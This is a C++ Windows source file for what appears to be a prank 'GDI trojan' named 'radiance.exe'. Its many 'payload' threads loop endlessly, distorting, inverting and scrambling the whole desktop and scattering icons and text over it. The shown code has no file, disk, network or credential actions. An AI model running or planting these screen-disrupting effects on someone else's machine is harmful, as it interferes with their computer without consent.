#include <iostream>
#include <windows.h>
#include <windowsx.h>
#include <cmath>
#include <stdio.h>
#include <tchar.h>
#include <ShlObj.h>
#include <time.h>
#include "GDIConfig.h"
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")

DWORD WINAPI DrawCursors(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc; HICON shifang; int size = 0;
    while (true) {
        HICON shifang = LoadCursor(0, IDC_APPSTARTING);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_ARROW);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_CROSS);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_HELP);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_IBEAM);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_NO);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_SIZEALL);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_SIZENESW);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_SIZENS);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_SIZENWSE);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_SIZEWE);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_UPARROW);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
        shifang = LoadCursor(0, IDC_WAIT);
        hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
    }
}

DWORD WINAPI DrawIcons(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1), size = 0;
    while (true) {
        HICON shifang = LoadIcon(NULL, MAKEINTRESOURCE(32512 + rand() % 4));
        HDC hdc = GetDC(0);
        size = 32 + rand() % 96;
        DrawIconEx(hdc, rand() % w, rand() % h, shifang, size, size, NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        DestroyIcon(shifang);
        DeleteObject(shifang);
        DeleteDC(hdc);
        Sleep(10);
    }
}

DWORD WINAPI CursorDrawIcon(LPVOID lpParam) {
    POINT cursor; int radius = 100, angle = 0, count = 0;
    while (true) {
        GetCursorPos(&cursor);
        int x = cursor.x + (radius * cos(angle * 3.1415926 / 14)), y = cursor.y + (radius * sin(angle * 3.1415926 / 14));
        HICON hIcon = LoadIcon(0, IDI_WARNING);
        HDC hdc = GetDC(0);
        DrawIcon(hdc, x, y, hIcon);
        ReleaseDC(0, hdc);
        DeleteObject(hIcon);
        DeleteDC(hdc);
        angle++;
        if (count == 10) {
            count = 0;
            Sleep(1);
        }
        else {
            count++;
        }
    };
}

DWORD WINAPI DrawTexts(LPVOID lpParam) {
    Sleep(10);
    while (true) {
        int rdx = 1 + rand() % 5; int xxx = (rdx * 10) - 10;
        int cWidth = 70 - xxx;
        int cHeight = 80 - xxx;
        LPCSTR pszFaceName = "Terminal";
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(NULL);
        SetBkMode(hdc, 1);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        HFONT font = CreateFontA(cHeight, cWidth, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, pszFaceName);
        SelectObject(hdc, font);
        TextOutA(hdc, rand() % w, rand() % h, "radiance.exe", 12);
        ReleaseDC(NULL, hdc);
        DeleteObject(font);
        DeleteDC(hdc);
        Sleep(50);
    }
}

VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
    ReleaseDC(NULL, hdc);
    DeleteObject(hrgn);
    DeleteDC(hdc);
}

VOID WINAPI ci2(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    SelectObject(hdc, hBrush);
    BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
    ReleaseDC(NULL, hdc);
    DeleteObject(hrgn); DeleteObject(hBrush);
    DeleteDC(hdc);
}

DWORD WINAPI Payload1_num1(LPVOID lpParam) {
    BLENDFUNCTION blur = { AC_SRC_OVER, 0, 50, 0 };
    while (true) {
        int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);

        for (int y = 0; y < h; y += 35) {
            for (int x = 0; x < w; x += 35) {

                if (rand() % 4 != 0) {
                    StretchBlt(hcdc, x, y, 35, 35, hcdc, x, y, 15, 15, SRCINVERT);
                }
                else {
                    StretchBlt(hcdc, x, y, 35, 35, hcdc, x, y, 15, 15, SRCERASE);
                };
            }
        }
        for (int i = 0; i < h; i++) {
            StretchBlt(hcdc, -2 + (rand() % 5), i, w, 1, hcdc, 0, i, w, 1, SRCCOPY);
        }

        StretchBlt(hcdc, 0, 0, w, h, hdc, 0, 0, w, h, NOTSRCERASE);
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        if (rand() % 30 == 0) { InvalidateRect(0, 0, 0); }
    }
}

DWORD WINAPI Payload2_num1(LPVOID lpParam) {
    int count = 0;
    while (true) {
        int w = GetSystemMetrics(SM_CXSCREEN); int h = GetSystemMetrics(SM_CYSCREEN);
        for (int x = 0; x <= w; x += 100) {
            HDC hdc = GetDC(0);
            HBRUSH hBrush = CreateSolidBrush(Hue(239));
            SelectObject(hdc, hBrush);
            BitBlt(hdc, x, 0, 100, h, hdc, x, 0, PATINVERT);
            ReleaseDC(0, hdc);
            DeleteObject(hBrush);
            DeleteDC(hdc);
            if (count == 10) {
                count = 0;
                Sleep(1);
            }
            else {
                count++;
            }
        }
    }
}

DWORD WINAPI Payload2_num2(LPVOID lpParam) {
    int radius = 2.5f; double angle = 0;
    while (true) {
        float x = cos(angle) * radius, y = sin(angle) * radius;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, x, y, SRCCOPY);
        BLENDFUNCTION blur = { AC_SRC_OVER, 0, 50, 0 };
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        angle = fmod(angle + 3.1415926 / radius, 3.1415926 * radius);
        Sleep(10);
    }
}

DWORD WINAPI Payload2_num3(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        StretchBlt(hdc, -1, 0, w, h, hdc, 0, 0, w, h, SRCAND);
        ReleaseDC(0, hdc);
        DeleteDC(hdc);
        Sleep(10);
    }
}

DWORD WINAPI Payload2_num4(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        for (int i = 0; i < w; i += 20) {
            StretchBlt(hcdc, i, rand() % 20, 20, h, hcdc, i, rand() % 20, 20, h, SRCCOPY);
        }

        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        Sleep(1);
    }
}

DWORD WINAPI Payload3_num1(LPVOID lpParam) {
    srand(time(NULL));
    while (true) {
        int rop = SRCCOPY; int luckynum = rand() % 5;
        if (luckynum == 2) { rop = SRCAND; }
        else if (luckynum == 4) { rop = SRCPAINT; }
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 6, rand() % 6, w, h, hdc, rand() % 6, rand() % 6, rop);
        ReleaseDC(0, hdc);
        DeleteDC(hdc);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI Payload3_num2(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1), count = 0; double size = w * 1.5;
    while (true) {
        srand(time(NULL));
        int x = w / 2, y = h / 2; int i = 0;
        for (i = 0; i < size; i += 2)
        {
            ci(x - (i / 2), y - (i / 2), i, i);
            if (count == 10) {
                count = 0; Sleep(1);
            }
            else {
                count++;
            }
        }
    }
    return 0;
}

DWORD WINAPI Payload4_num1(LPVOID lpParam) {
    int blocksize = 100; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 50, 0 };
    while (true) {
        int w = GetSystemMetrics(SM_CXSCREEN); int h = GetSystemMetrics(SM_CYSCREEN);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int luckynum = 1 + rand() % 25; int rop = SRCCOPY;
        if (luckynum == 3) { rop = SRCAND; }
        else if (luckynum == 5) { rop = SRCPAINT; }
        else if (luckynum == 10) { rop = SRCINVERT; }
        else if (luckynum == 15) { rop = 12000721; }
        else if (luckynum == 20) { rop = NOTSRCCOPY; }
        else if (luckynum == 25) { rop = NOTSRCERASE; }
        for (int x = 0; x <= w; x += blocksize) {
            for (int y = 0; y <= h; y += blocksize) {
                int rndx = x + (-5 + rand() % 10), rndy = y + (-5 + rand() % 10);
                int rndx2 = x + (-5 + rand() % 10), rndy2 = y + (-5 + rand() % 10);
                StretchBlt(hcdc, rndx, rndy, blocksize, blocksize, hcdc, rndx2, rndy2, blocksize, blocksize, rop);
            }
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1);
    }
    return 0;
}

DWORD WINAPI Payload5_num1(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    srand(time(NULL));
    while (true) {
        for (int i = 0; i < 40; i++) {
            int y = rand() % 4;
            int sj1 = rand() % w;
            int sj2 = rand() % h;
            HDC hdc = GetDC(0);
            if (y == 1) {
                StretchBlt(hdc, sj1 - 5, sj2, h, h, hdc, sj1, sj2, h, h, SRCCOPY);
            }
            if (y == 2) {
                StretchBlt(hdc, sj1 + 5, sj2, h, h, hdc, sj1, sj2, h, h, SRCCOPY);
            }
            if (y == 3) {
                StretchBlt(hdc, sj1, sj2 - 5, h, h, hdc, sj1, sj2, h, h, SRCCOPY);
            }
            if (y == 4) {
                StretchBlt(hdc, sj1, sj2 + 5, h, h, hdc, sj1, sj2, h, h, SRCCOPY);
            }
            int rand_x = rand() % w;
            int rand_y = rand() % h;
            BitBlt(hdc, rand() % 5, rand() % 5, rand() % w, rand() % h, hdc, rand() % 5, rand() % 5, SRCCOPY);
            BitBlt(hdc, rand_x, rand_y, 200, 200, hdc, rand_x + rand() % 40 - 10, rand_y + rand() % 40 - 10, SRCCOPY);
            ReleaseDC(0, hdc);
        }
        Sleep(1);
    }
}

DWORD WINAPI Payload5_num2(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        StretchBlt(hcdc, 1, 0, w, h, hcdc, 0, 0, w, h, SRCINVERT);
        StretchBlt(hcdc, 0, 1, w, h, hcdc, 0, 0, w, h, SRCINVERT);
        StretchBlt(hcdc, -1, 0, w, h, hcdc, 0, 0, w, h, SRCINVERT);
        StretchBlt(hcdc, 0, -1, w, h, hcdc, 0, 0, w, h, SRCINVERT);
        HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hcdc, hBrush);
        PatBlt(hcdc, 0, 0, w, h, PATINVERT);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hcdc);
        DeleteDC(hcdc);
        DeleteObject(hBitmap);
        DeleteObject(hBrush);
        Sleep(1);
    }
}

DWORD WINAPI Payload5_num3(LPVOID lpParam) {
    int count = 0;
    while (true) {
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        int aaa = rand() % w, bbb = rand() % h;
        HDC hdc = GetDC(NULL);
        BitBlt(hdc, aaa, bbb, 200, 200, hdc, aaa + rand() % 21 - 10, bbb + rand() % 21 - 10, SRCCOPY);
        ReleaseDC(NULL, hdc);
        if (count == 30) {
            count = 0;
            Sleep(1);
        }
        else {
            count++;
        }
    }
}

DWORD WINAPI Payload6_num1(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hBitmap, w * h * 4, data);
        int v = rand() % 114; BYTE byte = rand() & 0xffffff;
        for (int i = 0; w * h > i; i++) {
            ((BYTE*)(data + i))[v ? 450 : 995] += ((BYTE*)(data + i))[i % 18] & byte;
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1);
    }
}

DWORD WINAPI Payload6_num2(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        BitBlt(hcdc, 0, 0, w - 1, h, hcdc, w - 1, 0, SRCCOPY);
        BitBlt(hcdc, 1, 0, w, h, hcdc, 0, 0, SRCCOPY);
        BitBlt(hcdc, 0, 0, w, h - 1, hcdc, 0, h - 1, SRCCOPY);
        BitBlt(hcdc, 0, 1, w, h, hcdc, 0, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1);
    }
}

DWORD WINAPI Payload6_num3(LPVOID lpParam) {
    int size = 650;
    while (true) {
        int w = GetSystemMetrics(0) - 250, h = GetSystemMetrics(1) - 250;
        int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;
        for (int i = 0; i < size; i += 80) {
            ci2(x - i / 2, y - i / 2, i, i);
            Sleep(10);
        }
    }
}

DWORD WINAPI Payload6_num4(LPVOID lpParam) {
    BLENDFUNCTION blur = { AC_SRC_OVER, 0, 100, 0 };
    while (true) {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        for (int y = 0; y < h; y += 50) {
            for (int x = 0; x < w; x += 50) {
                StretchBlt(hcdc, x, y, 50, 50, hcdc, x, y, 1, 1, NOTSRCERASE);
            }
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc);
        DeleteDC(hcdc);
    }
}

DWORD WINAPI Payload7_num1(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    int i = 0, r = 2, g = 1, b = 4, p = 36;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hBitmap, w * h * 4, data);
        int v = 1 + rand() % 55;
        for (int i = 0; w * h > i; i++) {
            ((BYTE*)(data + i))[r] = ((BYTE*)(data + i + v * p))[r] + 11;
            ((BYTE*)(data + i))[g] = ((BYTE*)(data + i + v % p))[g] - 45;
            ((BYTE*)(data + i))[b] = ((BYTE*)(data + i + v % p))[b] % 14;
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        i %= 3;
    }
}

DWORD WINAPI Payload8_num1(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        for (int x = 0; x < w; x += 40) {
            HDC hdc = GetDC(NULL);
            StretchBlt(hdc, x, -20 + rand() % 40, 40, h, hdc, x, 0, 40, h, SRCCOPY);
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
            Sleep(1);
        }
    }
}

DWORD WINAPI Payload8_num2(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        for (int y = 0; y < h; y += 40) {
            HDC hdc = GetDC(NULL);
            StretchBlt(hdc, -20 + rand() % 40, y, w, 40, hdc, 0, y, w, 40, SRCCOPY);
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
            Sleep(1);
        }
    }
}

DWORD WINAPI Payload8_num3(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = h;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int rndrgb = RGB(1 + rand() % 254, 1 + rand() % 254, 1 + rand() % 254);
        for (int i = 0; i < w * h; i++) { rgbScreen[i].rgb %= rndrgb; }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(500);
    }
}

DWORD WINAPI Payload8_num4(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), count = 0;
        for (int i = 0; i < h; i++) {
            HDC hdc = GetDC(0);
            BitBlt(hdc, 0, i, w, 1, hdc, 0, i, NOTSRCCOPY);
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
            if (count == 25) {
                count = 0;
                Sleep(1);
            }
            else {
                count++;
            }
        }
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI Payload9_num1(LPVOID lpParam) {
    srand(time(NULL));
    int i = 0; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 90, 0 };
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(0);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = ((y)+(i + i * 60));

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / h * .10f, 1.f);
                hslcolor.s = 1.f;
                hslcolor.l = 0.2f;

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
    }
}

DWORD WINAPI Payload9_num2(LPVOID lpParam) {
    srand(time(NULL));
    while (true) {
        int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < h; i++) {
            int rndy = rand() % h;
            StretchBlt(hcdc, 0, i, w, 1, hcdc, 0, rndy, w, 1, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(2500);
    }
}

DWORD WINAPI Payload9_num3(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < h; i++) {
            StretchBlt(hcdc, -2 + (rand() % 5), i, w, 1, hcdc, 0, i, w, 1, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(hdc);
        DeleteObject(hcdc);
        DeleteObject(hBitmap);
        Sleep(10);
    }
}

DWORD WINAPI Payload10_num1(LPVOID lpParam) {
    srand(time(NULL));
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hcdc, hBrush);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int x = rand() % 100 - 56, y = (h / 2) - rand() % h;
        BitBlt(hcdc, 0, y, w, h, hcdc, x, y, SRCCOPY);
        PatBlt(hcdc, 0, y, w, h, PATINVERT);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap); DeleteObject(hBrush);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI Payload10_num2(LPVOID lpParam) {
    int radius = 12.3f; double angle = 0;
    BLENDFUNCTION blur = { AC_SRC_OVER, 0, 50, 0 };
    while (1) {
        float x = cos(angle) * radius, y = sin(angle) * radius;
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, x, y, SRCCOPY);
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc);  ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        angle = fmod(angle + 3.1415926 / radius, 3.1415926 * radius);
        Sleep(10);
    }
    return 0;
}

